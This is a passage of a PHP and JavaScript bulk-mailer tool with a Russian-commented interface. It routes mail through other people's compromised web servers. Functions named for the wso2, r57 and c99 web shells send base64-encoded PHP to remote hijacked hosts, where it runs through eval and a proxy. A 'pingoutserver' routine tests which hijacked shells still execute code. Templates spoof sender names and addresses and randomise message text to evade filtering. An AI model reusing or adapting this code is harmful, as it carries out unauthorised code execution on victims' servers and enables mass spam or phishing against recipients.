		'fgc_function'	  =>(int)function_exists("file_get_contents")
	);
	if(isset($_POST['API'])) {
		print json_encode($state);
		exit;
	}
	print "<h1>diagnostics</h1>";
	print "<pre>";
	print_r($state);
	print "</pre>";
	exit;
} elseif ($_SERVER['QUERY_STRING']=="pingoutserver") {
	$testcode="echo 'test';";
	$outserver=$_POST['server'];
	/*$list=explode(PHP_EOL, $_POST['servers']);
	$newlist=array();*/
	//foreach ($list as $outserver) {
	list($url,$type,$pass)=explode("|",$outserver);
	//сначала проверим что не 404
	$headers = get_headers($url, 1);
	if($headers[0]=="HTTP/1.1 404 Not Found") {
		print json_encode(array(
			"status"=>"BAD",
			"server"=>$outserver,
			"error"=>"404 not found"
		));
		exit;
	}
	//иначе проводим тест авторизации и выполнения кода
	$result=false;
	if($type=="wso2") {
		$answer=wso2exec($url,$pass,$testcode);
		if($answer=='test')
			$result=true;
	} elseif($type=="r57") {
		list($login,$pass)=explode(":", $pass);
		$answer=r572exec($url,$login,$pass,$testcode);
		if($answer=='test')
			$result=true;
	} elseif($type=="c99") {
		list($login,$pass)=explode(":", $pass);
		$answer=c992exec($url,$login,$pass,$testcode);
		if($answer=='test')
			$result=true;
	} elseif($type=="ars") {
		//list($login,$pass)=explode(":", $pass);
		$answer=ars2exec($url,$pass,"test");
		if($answer=='test')
			$result=true;
	}
	//}

	if($result)
		print json_encode(array(
			"status"=>"GOOD",
			"server"=>$outserver
		));
	else
		print json_encode(array(
			"status"=>"BAD",
			"server"=>$outserver,
			"error"=>"test command execution failed"
		));
	exit;
} elseif ($_SERVER['QUERY_STRING']=="linesinfile") {
	$file_path=$_POST['file_path'];
	if(!file_exists($file_path) || !is_readable($file_path))
		print "0";
	else {
		$file_data=explode("\n", file_get_contents($file_path));
		print count($file_data);
	}
	exit;
}
function ReplaceFileTemplate(&$target, &$email) {
	if(preg_match_all('/\[FILE:(.+?)\]/', $target, $arr, PREG_PATTERN_ORDER)) {
		foreach ($arr[0] as $key => $value) {
			$file_path=$arr[1][$key];
			if(!file_exists($file_path) || !is_readable($file_path))
				$target=str_replace($value, "file not available", $target);
			else {
				$file_data=explode("\n", file_get_contents($file_path));
				$result_str=$file_data[($email[enumer]-1)%count($file_data)];
				$target=str_replace($value, $result_str, $target);
			}
		}
	}
}
function ReplaceTemplates(&$target, &$email) {
	$target=str_replace('[TO-EMAIL]', $email[to], $target);
	$target=str_replace('[FROM-NAME]', $email[fromname], $target);
	$target=str_replace('[FROM-EMAIL]', $email[frommail], $target);
	$target=str_replace('[REPLY-EMAIL]', $email[replymail], $target);
	$target=str_replace('[THEME]', $email[tema], $target);
	//Макрос умножения
	

	foreach ($email[additional] as $key => $value) {
		$target=str_replace('[ADD'.$key.']', $value, $target);		
	}
	ReplaceFileTemplate($target, $email);
	if(preg_match_all('/\[(DATE|DAY|MONTH|YEAR|TIME|HOUR|MINUTE)([+-]\d+)*\]/', $target, $arr)) {
		foreach ($arr[0] as $key => $value) {
			switch ($arr[1][$key]) {
				case 'DATE':
					$txt_val=date("d.m.Y", strtotime(intval($arr[2][$key])." day"));
					break;
				case 'DAY':
					$txt_val=date("d", strtotime(intval($arr[2][$key])." day"));
					break;
				case 'MONTH':
					$txt_val=date("m", strtotime(intval($arr[2][$key])." month"));
					break;
				case 'YEAR':
					$txt_val=date("Y", strtotime(intval($arr[2][$key])." year"));
					break;
				case 'TIME':
					$txt_val=date("H:i", strtotime(intval($arr[2][$key])." minute"));
					break;
				case 'HOUR':
					$txt_val=date("H", strtotime(intval($arr[2][$key])." hour"));
					break;
				case 'MINUTE':
					$txt_val=date("i", strtotime(intval($arr[2][$key])." minute"));
					break;
				default:
					$txt_val='';
					break;
			}
			$target=str_replace($value, $txt_val, $target);
		}
	}
	if(preg_match_all('/\[\((.*?)\)\*(\d+)\]/', $target, $arr, PREG_PATTERN_ORDER)) {
		foreach ($arr[0] as $key => $value) {
			$target=str_replace($value, str_repeat($arr[1][$key], $arr[2][$key]), $target);
		}
	}
	if(preg_match_all('/\[ENUM:([^\[\]]+?)\]/', $target, $arr, PREG_PATTERN_ORDER)) {
		foreach ($arr[0] as $key => $value) {
			$enum_array=explode("|", $arr[1][$key]);
			$enum_array_length=count($enum_array);
			$target=str_replace($value, $enum_array[$email[enumer]%$enum_array_length], $target);
		}
	}

	if(preg_match_all('/\[RAND\]/', $target, $arr, PREG_PATTERN_ORDER)) {
		foreach ($arr[0] as $key => $value) {
			$target=preg_replace("/\[RAND\]/", rand(5000,6000), $target, 1);
		}
	}
	if(preg_match_all('/\[RAND\-(\d+)\-(\d+)\]/', $target, $arr, PREG_PATTERN_ORDER)) {
		foreach ($arr[0] as $key => $value) {
			$target=preg_replace("/".str_replace(array("[","]"), array("\[","\]"), $value)."/", rand($arr[1][$key],$arr[2][$key]), $target, 1);
		}
	}
	while(preg_match_all('/\[RAND:([^\[\]]+?)\]/u', $target, $arr, PREG_PATTERN_ORDER)) {
		foreach($arr[0] as $key => $value) {
			$words=explode("|",$arr[1][$key]);
			$target=preg_replace("/".preg_quote($value,"/")."/", $words[array_rand($words)],$target, 1);
		}
	}
}
function applyEnumer($field, $enumer) {
	if(strpos($field, "\n")==-1) return $field;

	$field_values=explode("\n", $field);
	$field_values_count=count($field_values);

	$value=$field_values[$enumer%$field_values_count];

	return  $value;
}
function makeAttach($attachedFiles, $boundary) {
	$data="";
	if($attachedFiles==null) return $data;
	foreach ($attachedFiles as $index => $file) {
		if($file==null) continue;
		$data.="--$boundary\n";
		$data.="Content-Type: ".$file['type']."; name=\"".$file['name']."\"\n";
		$data.="Content-Transfer-Encoding:base64\n";
		$data.="Content-ID: <".md5($file['name']).">\n\n";
		$data.=chunk_split($file['content'])."\n";
	}
	return $data;
}
function wso2exec($url, $pass, $code) {
	$postdata = http_build_query(
		array(
			'pass' => $pass,
			'a' => 'RC',
			'p1' => trim($code)
		)
	);

	return get_content($url, $postdata, 10);
}
function ars2exec($url, $pass, $req="test", $data) {
	$postdata = http_build_query(
		array(
			'pass' => $pass,
			'req' => $req,
			'data' => $data
		)
	);
	$response=get_content($url, $postdata, 10);
	$response_decoded=json_decode($response,true);
	if($req=="test")
		if($response_decoded['status']=="GOOD")
			return "test";
		else
			return "bad";
	//print $response;
	return $response_decoded;
}
function r572exec($url, $login, $pass, $code, $timeout=10) {
	$str_start=randomstr();
	$str_end=randomstr();
	$eval_sub='eval(base64_decode($_POST["debug_value_fgtr"]));';
	$eval_sub="echo('".substr($str_start,0,4)."'.'".substr($str_start,4,4)."');".$eval_sub."die('".substr($str_end,0,4)."'.'".substr($str_end,4,4)."');";

	$post='php_eval='.urlencode($eval_sub).'&dir=.%2F&cmd=php_eval&submit=exec&debug_value_fgtr='.urlencode(base64_encode($code));

	if(!empty($pass) && !empty($login)){
		$post.='&auth_user='.urlencode($login).'&auth_pass='.urlencode($pass);
		$headers=array('Authorization: Basic '.base64_encode($login.':'.$pass));
	}else{
		$headers=array();
	}
	$headers[]='Content-type: application/x-www-form-urlencoded';

	$opts = array('http' =>
		array(
			'method'  => 'POST',
			'proxy'   => (defined('PROXY'))?('tcp://' . PROXY):null,
			'header'  => implode(PHP_EOL, $headers),
			'timeout' => $timeout,
			'content' => $post
		)
	);
	//print_r($opts);
	$context  = stream_context_create($opts);
	$response=@file_get_contents($url, false, $context);
	$response=strstr($response, $str_start);
	$response=str_replace(array($str_end, $str_start), "", $response);
	return $response;
}
function c992exec($url, $login, $pass, $code, $timeout=10) {
	$str_start=randomstr();
	$str_end=randomstr();
	$eval_sub='eval(base64_decode($_POST["debug_value_fgtr"]));';
	$eval_sub="echo('".substr($str_start,0,4)."'.'".substr($str_start,4,4)."');".$eval_sub."die('".substr($str_end,0,4)."'.'".substr($str_end,4,4)."');";

	$post='act=eval&eval='.urlencode($eval_sub).'&d=.%2F&eval_txt=1&debug_value_fgtr='.urlencode(base64_encode($code));

	if(!empty($pass) && !empty($login)){
		$headers=array('Authorization: Basic '.base64_encode($login.':'.$pass));
	}else{
		$headers=array();
	}
	$headers[]='Content-type: application/x-www-form-urlencoded';

	$opts = array('http' =>
		array(
			'method'  => 'POST',
			'proxy' => (defined('PROXY'))?('tcp://' . PROXY):null,
			'header'  => implode(PHP_EOL, $headers),
            'timeout' => $timeout,
			'content' => $post
		)
	);
	//print_r($opts);
	$context  = stream_context_create($opts);
	$response=@file_get_contents($url, false, $context);
	$response=strstr($response, $str_start);
	$response=str_replace(array($str_end, $str_start), "", $response);
	return $response;
}
function randomstr($int=8){
	$str='';
	$arr='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
	for($i=0;$i<$int;$i++) $str.=$arr{rand(0,61)};
	return $str;
}
function get_content($url, $post,$timeout) {
	$opts = array('http' =>
		array(
			'method'  => 'POST',
			'proxy' => (defined('PROXY'))?('tcp://' . PROXY):null,
			'header'  => 'Content-type: application/x-www-form-urlencoded',
                        'timeout' => $timeout,
			'content' => $post
		)
	);
	$context  = stream_context_create($opts);
	return @file_get_contents($url, false, $context);
}

?>
<html>
<head>
<title><?php tr('name',false); ?> <?php echo VERSION;?></title>
<meta http-equiv="content-type" content="text/html; charset=utf-8" />
<script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
<link href="http://netdna.bootstrapcdn.com/bootswatch/2.3.0/united/bootstrap.min.css" rel="stylesheet">
<link rel="shortcut icon" type="image/x-icon" href="data:image/png;base64,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" />
<style>
body {
    background-color: WHITE;
}

.content {
    margin: 0 auto;
    background-color: #fcf2d4;
    width: 1000px;
    padding: 5px;
    border: 1px solid black;
    border-radius: 5px;
}

#console {
    margin: 0 auto;
    padding: 5px;
    border-radius: 5px;
}

#ext-console {
    padding: 5px;
    border-radius: 5px;
    overflow-y: scroll;
    height: 620px;
    text-align: left;
}

a:link {
    color: #000;
}

a:visited {
    color: #000;
}

.miniimput {
    font-family: Tahoma,Geneva,sans-serif;
    font-size: 14pt;
    border-color: 336699;
    border-style: inset;
    border-width: 2px;
}

#upload_button {
    display: inline-block;
    width: 24px;
    height: 24px;
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAADb0lEQVR42q2Va2gUVxTH/3dmdxMza8QQrRa0VFGjNEWzVCIENz4aX6C2H6wWRD8KVQpRCxUfQRDU2hbRD2o+iFqqtPUVo2ts89iqNRojLT7S7NZHTNwYsxs3j83uZmbu6ZkNSARFs+uB4V7m3vv/3fOYMwIpWJGnnYQCVMwbIV63RwxGcKAVlrfThmkaasMmahqjuPL5yFdqJQWYWfaMilncnmZHU1zC+6AHjx5HcX3lGJEywH36Ka1zDcUopwNXwwZsHKJ0m8C5W8/xLBDFrTXjRNIA15EWWvpxBmZ/4ERVB4sTYBJB8ihZyuNtRaw7jn/WTxGDBuSWNtEXeUNRMNaJypAOhYVNC8DqpuQN1lwFqioDiHVG0bB1qnhrQN7Bh/QZhyXnvQyUP4kjN8uBll5WTUDYA4b0xEzE+J0uBBouN0Pvi+O/nfnijYC8/X6yxj5DwtBN9Pbo+O2riThwPwaFj5t8fVIEfPfCCNxphcKuCOuRlFySx35bT8e+zsHexjjsfHudhawItTQ+R+huAA/3u5NPsmXvF9fS4Y0fYfffEdj4uOREGPw+6OtAV0MATaVzUgOMWuOlQ5tc2FHXBc4pDAaYLNPpCyLua0bz0UWpAUau/p32leRj859hOPh0X5+EVAVi/iDo/mMETixNDZC9/ALt2ePGN54Q7Gp/iEzitPpb+XmE4JllqQGw8CyNn5SFpjtPYVdkooosk8RVFuP51ZUvA8rOVwyRUm6VRPG30eeKlJoDEf4GdEVR6MUV+0dFSqRH4kjneTqvbxe/niprn/GJK1vlpkI0aH8GhEJwX7InRpMMGIaOv+rqg+La9ZuUP92VvPIAq2urRigaQsHo+XCmOVF7ox6iuvoyFRYWMNFIWlgVKtoibdhyezEyhwSRS9uw2rUKNTVXIC5UVFLRnJlcbnpKgEB3AAtPTsaI0RqWaCUonrsWnktVEKfOlFPRp7Oh6zqE1Zre3J5eEX/AoabB3+bnxgd8mD0GdocDFy/9AfHT8V9owby56OgIo6e7G0JRkvLCgijsiVWumqZheNYweCoYUHr4CM1yu+Hz+3Gv4V+oqpp0qCwzTRNTJudg4oQJqPZ6IXZ99yN9uWJ5Islct/1hSsEo8X+QsNls+Pn4CYhNm0u+1zK04sxhmYnFd2HWJbs6uxDpjfzwP0ptjebUDXW8AAAAAElFTkSuQmCC);
}

#help-screen,#settings-screen,#preview-screen {
    display: none;
}

#done {
    background-color: YellowGreen;
    width: 0;
    height: 15px;
    padding: 0;
    margin: 0;
    border-radius: 5px;
}

.addfield {
    font-family: "Arial Black","Gadget",sans-serif;
    font-size: 30px;
    color: #04bf0a;
    -moz-user-select: none;
    -khtml-user-select: none;
    user-select: none;
    cursor: pointer;
}

#makebold {
    font-weight: bold;
}

#makeitalic {
    font-style: italic;
}

#makeunderline {
    text-decoration: underline;
}

.button {
    padding: 5px 10px;
    display: inline;
    background: #777 url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAABkCAYAAABHLFpgAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAALdJREFUeNrEjkEWwiAQQyGlwOAN3Hv/m3UnA62vONF2p25lkfeTwAx+CuEWYgguxBgdYoo7YkwDOWeKDEjOO6TQStlRXlkRIylGl3JQYSaFJGxJIq9M2No9OYbuSOncYXuHWZN5Nglhcm6M4eDsfJDrt+Jv8vO7hyzL4rFtD8rmsPbu0bcOtEZq6tG0eVSKqlqhldao1grL2NY728qMhdozfbfqz3sc1dpBnYvMeqyrbet99U8BBgCRTXT4kGguQQAAAABJRU5ErkJggg==) repeat-x bottom;
    border: 0;
    color: #fff;
    cursor: pointer;
    font-weight: bold;
    border-radius: 5px;
    -moz-border-radius: 5px;
    -webkit-border-radius: 5px;
    text-shadow: 1px 1px #666;
    margin: 0 5px;
}

.button:hover {
    background-position: 0 -48px;
}

.button:active {
    background-position: 0 top;
    position: relative;
    top: 1px;
    padding: 6px 10px 4px;
}

#attachedFiles .File a {
    color: RED;
    font-weight: bold;
    text-decoration: none;
    font-family: 'Arial Black',Gadget,sans-serif;
}

#attachedFiles div {
    display: inline-block;
    width: 24px;
    height: 24px;
    background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAFF0lEQVR42o2Ve0xTVxjAv9MWOhRruRMsbx1YkJeiYMRlQ+PmYuZ0Y1NReagZwwm4LdkW/9hmzLYYTYwIQaPDsclwxsnclszXdGEzivJYeRVWHlIK8tbbF31B+XZuKUmvtLiTnN4v55x+v/M9DwHn+Pz0eVEFu7BBHiCJmUTklgjAlEBFp0xc1hySPtjX62jqC0zxntWRRnAzyLSwJD7RN+KDU4by9EQcNdvoBqcM0OUcTn/pgND5PlBeoyFib+HIbdXA8U1LA47tSI7A2QDSxQdK2KI346HzsZGqF3jSD5yFq0MZeOPMPfglJwVuqIa1lY29xdtj/Q/tWi3HWQElaQnYzY5RgGcLOEBSkBQ2n60mFdnJOMdLCNdUIxPXlX1nU8PmfbZvbZx2BkBOAYso4PTbCajWmkFAfURVovPUlOz8coDEwPnwVul98nvuGhwx2cBHJCRX24asf6r6v305ZE7ee+uW4QxAOAV8884y0OjMQIjnGE9SMUEmgW3f14LNNgETdMFOZ3ZyGPzcNjiBN09Jbl2uMPMBCRRQUMKe27ocH+nNs7qIC7JELIIQiQ/vjFgkwM3fPQB1cQHT3vSP1i2gbNtyHDBYuct6dBE4taJrKtPdIMlzuOeSAnrcAaIoIIwCzqevgEGjxaHLUxbxc2RaP4DMVwxZFxWgKc73U3kC/LBjBQ6PcXXwbAJ3Bl3O+M/1xowf66GnKJ9pb1a4B1zYuRJHTc8GEJpmAu7H4SNHahHGxwt3XqgD9ck8pqOlwQ0gv4S9mLESWVrJ/LbgmkaAXPx1T1gY6R/gRJwrkcDC0GAK8Mbt5bWgLtpPAY3uAT9lJoHWMu7x+tylR4dG4N+WNhgcZR2rRoMRQsKDYeuWDZBWRrPo5D6/DmWTe0BlVhLqrRP8CDplLnVFIhE+6tHArdt3YOOmV2kvEmN9jQJ6+wdJQe4u3HyuGroL32c6W58CcK1iEY3BlexkGLPZnTuu+gGEQiH8VXUXdDo9DA2PQl7ebkeBKWoaoK6pFT7MzYDXS6vhYWGuX1drMx+weGm8NPKjM+ylzCR0uugpCwgKvYTkj9+uoX7MBBaLFTKz04lJy6JarYG6ZhXJz9mFabTQOo/nMN2qVj5gUVSMVP5xKVu4JQ5Vo0ZnJbsGGVAgEhG2/h7qjCawWq0QnbqedNypwkCZPyh7Bkhm1nYsqFSA6uhepqdTxQeEy2OkUZ+Usidpu+6gAIGAzAiyQCiCx3V34bHeAOO2cVi2YSN0378D0vnzQKkegMysdMi/rIC2I7v9eh+28wFhS5ZKoz8957CgnQM83YsojwLIk/q72PloGBaHyADtdqIzWTB44fPQ3NVHMrLSqQUN0Hokm+l72MEHhERGS+MOltFWkThVaI4Md7rIIdMsomY9uHkDzSCkgECwWcxE4seg1WyC+uY2krNnJ2ZcqIeWrzOZvu5OPiA4IkoqfrdoUO4vEU/ijJfPMez0lXtN0AdCqwk0c4JhEHzgpQBvWGAegl/bhuBJYCx0DGktljP7A/vVXXxAbMpaH2V1VQQV58IsQxYUGr8398DhmGi5zNtLJNAbx2xNLcreomOHd9PtcTrHYpPXdClr7/Hfg6xDJ0hj1XUx9YaQ8whxdhlCJy0u7oVzeMxiNDAmnfYVJkCWQpe8JyftuoHenpsLgkKrqTYr/Yd9+YvrrGXHvuC/aP935Bz8UvT31SsS2o59ucTibr1q7QZDbOIqQ9mJr2b49j9nY543+33RowAAAABJRU5ErkJggg==);
}

#TIMEOUT_RANGE {
    display: inline-block;
    margin-left: 20px;
    vertical-align: middle;
    width: 300px;
}

.alexus-range,.alexus-range .crange {
    height: 20px;
    padding: 0;
}

.alexus-range .crange {
    background-color: Orange;
}

.alexus-range,.alexus-range .crange,.alexus-range .range-controller {
    -webkit-border-radius: 3px;
    -moz-border-radius: 3px;
    border-radius: 3px;
}

.alexus-range {
    width: 100%;
    background-color: white;
    text-align: left;
    margin-top: 10px;
    margin-bottom: 10px;
}

.alexus-range .crange {
    width: 0;
}

.alexus-range .range-controller {
    width: 15px;
    height: 25px;
    margin-top: -24px;
    margin-left: 0;
    cursor: pointer;
    padding: 0;
}

.barcounter {
    position: absolute;
    text-align: center;
    width: 700px;
}

.txtinput {
    height: 28px;
    min-height: 28px;
}

.form-horizontal .control-label {
    width: 250px;
}

.form-horizontal .controls {
    margin-left: 260px;
}

.button.white {
    background-color: NavajoWhite;
    color: #000;
    text-shadow: 1px 1px NavajoWhite;
}

.button.large {
    font-size: 125%;
    padding: 7px 12px;
}

.button.large:hover {
    background-position: 0 -35px;
}

.button.large:active {
    padding: 8px 12px 6px;
    background-position: 0 top;
}

h2 {
    margin-top: -15px;
}

#prime img, #help img, #settings img {
    height: 24px;
}
#outprogressbar .barcounter {
    width: 900px;
}
</style>
<style type="text/less">
.status {
	padding: 5px;
	/*.header {
		b {
			display: inline-block;
			margin-top: -7px;
		}
		i {
			display: block;
			float: right;
			margin-top: -3px;
		}
	}
	.data {
		padding-top: 10px;
	}*/
	.controls {
		text-align: right;
		float: right;
	}
}
</style>
<script src="http://cdnjs.cloudflare.com/ajax/libs/less.js/1.4.1/less.min.js" type="text/javascript"></script>
<script>
var Done=new Array();
var maxDoneSize=25;
var toDo=new Array();
var additional=new Array(); var toDoSize=0;
var enumer=0;
var attachedFiles=new Array();
var outServers={
	active: false,
	position: 0,
	servers: new Array(),
	servers_hash: "",
	updateServers: function() {
		if(this.servers_hash==$("#out_servers").val()) return;
		this.servers_hash=$("#out_servers").val();
		var tmpservers=this.servers_hash.split("\n");
		this.servers=[];
		for(var i in tmpservers) {
			if(tmpservers[i].length<3) continue;
			this.servers.push(tmpservers[i]);
		}
		this.position=0;
	},
	getServer: function() {
		if(this.position>=this.servers.length) this.position=0;
		var serv=this.servers[this.position];
		this.position++;
		return serv;
	}
}
var threadNum=4;
var timeoutNum=0;
var AddNum=1;
var status="stop";

function ChangePass(login, pass) {
	$.post('<?php print $_SERVER['PHP_SELF'];?>?changepass',{login:login,pass:pass}, function(data) {
		var response=$.parseJSON(data);
		if(response['result']=='ok') 
			$("#passchangesuccess").show();
		else
			$("#passchangeerror").show();

	});
}
function pingoutservers() {
	var servers=$("#out_servers").val();
	if(servers=="") return;
	window.pingout_servers=servers.split("\n");
	window.pingout_servers_todo=window.pingout_servers.length;
	$("#out_servers").val("");
	$("#pingout_log").html("");

	update_pingoutprogress();
	for(var i=0; i<4; i++)
		pingout_server();
}
function pingout_server() {
	if(window.pingout_servers.length==0) return;
	var server=window.pingout_servers.pop();
	$.post('<?php print $_SERVER['PHP_SELF'];?>?pingoutserver',{server:server}, function(data) {
		var result=$.parseJSON(data);
		var log=$("#pingout_log").html();
		if(result.status=="GOOD") {
			$("#pingout_log").html(log+"<span style='color:green;'>"+result.server+" работает</span><br>");
			$("#out_servers").val($("#out_servers").val()+result.server+"\n");
		} else {
			$("#pingout_log").html(log+"<span style='color:red;'>"+result.server+" ошибка: "+result.error+"</span><br>");
		}
		$("#pingout_log").scrollTop($("#pingout_log").prop("scrollHeight"));

		update_pingoutprogress();
		pingout_server();
	});
}
function update_pingoutprogress() {
	var pingoutservers_done=window.pingout_servers_todo-window.pingout_servers.length;
	var opb=$("#outprogressbar");
	$(opb).find(".barcounter").text(pingoutservers_done+"/"+window.pingout_servers_todo);
	var percent=parseInt(pingoutservers_done/(window.pingout_servers_todo/100));
	$(opb).find(".bar").css("width",percent+"%");
}
function Send(){
	enumer=0;
	if($("#use_out_servers").is(':checked')) {
		outServers.updateServers();
		outServers.active=true;
	} else {
		outServers.active=false;
	}

	
	var res=$("#to").val().match(/\[FILE:(.+?)\]/);
	if(res!=null) {
		var pattern=res[0];
		var file_path=res[1];
		$.post("?linesinfile",{file_path:file_path},function(data){
			var linesinfile=parseInt(data);
			toDo=[];
			for(var i=0;i<linesinfile;i++)
				toDo.push(pattern);
			toDoSize=toDo.length;
			SetProgressBar(0,"0/"+toDoSize);
			ResumeSendMail();
		});
	} else {
		toDo=$("#to").val().split("\n");
		toDoSize=toDo.length;
		SetProgressBar(0,"0/"+toDoSize);
		ResumeSendMail();
	}
}
function PauseSendMail() {
	status="pause";
	$("#PauseSendMail").prop("disabled",true);
	$("#ResumeSendMail, #StopSendMail").prop("disabled",false);
	$(".status span.tr-status-idle").removeClass("label-success label-warning").addClass("label-danger").text("<?php tr('status-pause',false);?>");
}
function ResumeSendMail() {
	status="start";
	$("#ResumeSendMail").prop("disabled",true);
	$("#PauseSendMail, #StopSendMail").prop("disabled",false);
	$(".status span.tr-status-idle").removeClass("label-danger label-warning").addClass("label-success").text("<?php tr('status-sending',false);?>");
	for(var i=0; i<threadNum; i++) SendMail();
}
function StopSendMail() {
	status="stop";
	StopSendMailHandler();
}
function Preview(){
		var params={
		to		:"null@null.null",
		fromname:ReplaceEnum($("#fromname").val(), false),
		frommail:ReplaceEnum($("#frommail").val(), false),
		replymail:ReplaceEnum($("#replymail").val(), false),
		tema	:ReplaceEnum($("#tema").val(), false),
		type	:$("#type").val(),
		text	:ReplaceEnum($("#text").val()),
		enumer  :(toDoSize-toDo.length)
	};
		if(additional.length==0)
		$(".additional").each(function(){
			additional.push(ReplaceEnum($(this).val()));
		});
	else
		$(".additional").each(function(index, value){
			if(index<additional.length) return;
			additional.push(ReplaceEnum($(this).val()));
		});
	for(i in additional) {
		params["additional["+i+"]"]=additional[i];
	}
	$.post('<?php print $_SERVER['PHP_SELF'];?>?preview', params, function(data){
		if($("#type").val()=='text')
			showPreviewWindow('data:text/plain;charset=utf-8;base64,'+Base64.encode(data));
		else
			showPreviewWindow('data:text/html;charset=utf-8;base64,'+Base64.encode(data));
			});
}
function StopSendMailHandler() {
	//alert("Рассылка завершена!");
	$(".status span.tr-status-idle").removeClass("label-success label-danger").addClass("label-warning").text("<?php tr('status-idle',false);?>");
	$(".status .btn").prop("disabled",true);
}
function SendMail() {
	if(status=="pause")
		return;
	else if(status=="stop") {
		//toDo=[];
		//toDoSize=0;
		//SetProgressBar((toDoSize-toDo.length)/(toDoSize/100),(toDoSize-toDo.length)+"/"+toDoSize);
		return;
	}
	
	if(toDo.length==0) {//!email || email=="" || email==" ") {
		//останавливаем остальные потоки и генерируем событие окончания рассылки
		status="stop";
		StopSendMailHandler();
		return;
	}
	var email=toDo.pop();
	
	additional=new Array();
	if(email.indexOf(";")!=-1) {
		var emailadds=email.split(";");
		for(var adds in emailadds) {
			if(adds==0) 
				email=emailadds[0];
			else
				additional.push(emailadds[adds]);
		}
	}
	var params={
		to		:email,
		fromname:ReplaceEnum($("#fromname").val(), false),
		frommail:ReplaceEnum($("#frommail").val(), false),
		replymail:ReplaceEnum($("#replymail").val(), false),
		tema	:ReplaceEnum($("#tema").val(), false),
		type	:$("#type").val(),
		captcha_code:$("input[name=captcha_code]").val(),
		text	:ReplaceEnum($("#text").val()),
		enumer  :(toDoSize-toDo.length)
	};
